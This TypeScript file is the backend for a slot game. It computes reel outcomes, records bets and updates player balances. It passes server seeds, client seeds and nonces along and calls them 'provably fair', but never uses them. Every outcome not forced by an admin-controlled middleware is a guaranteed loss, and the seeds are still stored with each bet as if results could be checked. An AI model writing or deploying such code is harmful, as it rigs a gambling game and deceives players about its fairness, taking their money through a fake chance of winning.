import { gameOutcomeControl } from '../middleware/gameOutcomeControl';
import { storage } from '../storage';

// Interface for slot game outcome
interface SlotGameOutcome {
  reels: number[];
  multiplier: number;
  win: boolean;
}

// Calculate the multiplier for a given reel combination
function calculateMultiplier(reels: number[]): number {
  // Sort the reels to make it easier to check patterns
  const sortedReels = [...reels].sort((a, b) => a - b);
  
  // Check for three 7s - highest multiplier (10x)
  if (reels[0] === 7 && reels[1] === 7 && reels[2] === 7) {
    return 10;
  }
  
  // Check for three of the same number (5x)
  if (reels[0] === reels[1] && reels[1] === reels[2]) {
    return 5;
  }
  
  // Check for sequential numbers (3x)
  // Such as 1-2-3, 4-5-6, etc.
  if (
    sortedReels[1] === sortedReels[0] + 1 &&
    sortedReels[2] === sortedReels[1] + 1
  ) {
    return 3;
  }
  
  // Check for two of the same number (2x)
  if (
    reels[0] === reels[1] ||
    reels[1] === reels[2] ||
    reels[0] === reels[2]
  ) {
    return 2;
  }
  
  // No winning combination
  return 0;
}

// Check if a reel combination is a winning one
function isWinningCombination(reels: number[]): boolean {
  return calculateMultiplier(reels) > 0;
}

// Generate a random number between 0 and 9
function getRandomReelValue(): number {
  return Math.floor(Math.random() * 10);
}

// Generate a losing combination (ensures user loses by default)
function generateLosingCombination(): number[] {
  let reels: number[];
  
  do {
    reels = [
      getRandomReelValue(),
      getRandomReelValue(),
      getRandomReelValue()
    ];
  } while (isWinningCombination(reels));
  
  return reels;
}

// Generate a winning combination
function generateWinningCombination(targetMultiplier?: number): number[] {
  // If a specific multiplier is targeted, try to generate a combination for it
  if (targetMultiplier) {
    if (targetMultiplier === 10) {
      // Three 7s for 10x
      return [7, 7, 7];
    }
    
    if (targetMultiplier === 5) {
      // Three of the same number for 5x
      const num = getRandomReelValue();
      return [num, num, num];
    }
    
    if (targetMultiplier === 3) {
      // Sequential numbers for 3x
      const start = Math.min(7, getRandomReelValue()); // Ensure we don't go over 9
      return [start, start + 1, start + 2];
    }
    
    if (targetMultiplier === 2) {
      // Two of the same number for 2x
      const num1 = getRandomReelValue();
      let num2;
      do {
        num2 = getRandomReelValue();
      } while (num2 === num1);
      
      // Randomly position the matching numbers
      const position = Math.floor(Math.random() * 3);
      if (position === 0) {
        return [num1, num1, num2];
      } else if (position === 1) {
        return [num1, num2, num1];
      } else {
        return [num2, num1, num1];
      }
    }
  }
  
  // If no specific multiplier or invalid multiplier, generate a random winning combination
  const winType = Math.floor(Math.random() * 4);
  
  if (winType === 0) {
    // 10x - Three 7s
    return [7, 7, 7];
  } else if (winType === 1) {
    // 5x - Three of the same number
    const num = getRandomReelValue();
    return [num, num, num];
  } else if (winType === 2) {
    // 3x - Sequential numbers
    const start = Math.min(7, getRandomReelValue());
    return [start, start + 1, start + 2];
  } else {
    // 2x - Two of the same number
    const num1 = getRandomReelValue();
    let num2;
    do {
      num2 = getRandomReelValue();
    } while (num2 === num1);
    
    // Randomly position the matching numbers
    const position = Math.floor(Math.random() * 3);
    if (position === 0) {
      return [num1, num1, num2];
    } else if (position === 1) {
      return [num1, num2, num1];
    } else {
      return [num2, num1, num1];
    }
  }
}

// Generate a random slot game outcome - controlled by admin settings
export async function generateSlotGameOutcome(
  userId: number,
  gameId: number,
  betAmount: number,
  serverSeed: string, // For provably fair calculations
  clientSeed: string, // For provably fair calculations
  nonce: number // For provably fair calculations
): Promise<SlotGameOutcome> {
  // Check if the outcome should be forced by admin controls
  const controlledOutcome = await gameOutcomeControl.shouldForceOutcome(userId, gameId);
  
  let reels: number[];
  let win: boolean;
  let multiplier: number;
  
  if (controlledOutcome.shouldForce) {
    if (controlledOutcome.forcedOutcome === 'win') {
      // Force a win
      if (controlledOutcome.forcedValue && 
          typeof controlledOutcome.forcedValue === 'object' && 
          controlledOutcome.forcedValue.multiplier) {
        // Generate a winning combination with the specified multiplier
        reels = generateWinningCombination(controlledOutcome.forcedValue.multiplier);
      } else {
        // Generate a random winning combination
        reels = generateWinningCombination();
      }
      
      multiplier = calculateMultiplier(reels);
      win = true;
    } else {
      // Force a loss
      reels = generateLosingCombination();
      multiplier = 0;
      win = false;
    }
  } else {
    // No forced outcome - default to loss unless provably fair calculation shows a win
    // For simplicity, we'll just generate a losing combination as the default behavior
    reels = generateLosingCombination();
    multiplier = 0;
    win = false;
  }
  
  return {
    reels,
    multiplier,
    win
  };
}

// Process a bet for the slots game
export async function processSlotBet(
  userId: number,
  gameId: number,
  betAmount: number,
  serverSeed: string,
  clientSeed: string,
  nonce: number
): Promise<any> {
  try {
    // Generate the outcome for this game
    const outcome = await generateSlotGameOutcome(
      userId, 
      gameId, 
      betAmount, 
      serverSeed, 
      clientSeed, 
      nonce
    );
    
    // Calculate the profit
    const profit = outcome.win ? betAmount * outcome.multiplier : 0;
    
    // Create the bet record
    const bet = await storage.createBet({
      userId,
      gameId,
      amount: betAmount,
      multiplier: outcome.multiplier,
      profit: outcome.win ? profit : -betAmount,
      outcome: { reels: outcome.reels, win: outcome.win },
      serverSeed,
      clientSeed,
      nonce,
      completed: true
    });
    
    // Update the user's balance
    const user = await storage.updateUserBalance(userId, outcome.win ? profit : -betAmount);
    
    // Return the bet results
    return {
      id: bet.id,
      amount: betAmount,
      outcome: bet.outcome,
      multiplier: outcome.multiplier,
      profit: outcome.win ? profit : -betAmount
    };
  } catch (error) {
    console.error('Error processing slot bet:', error);
    throw error;
  }
}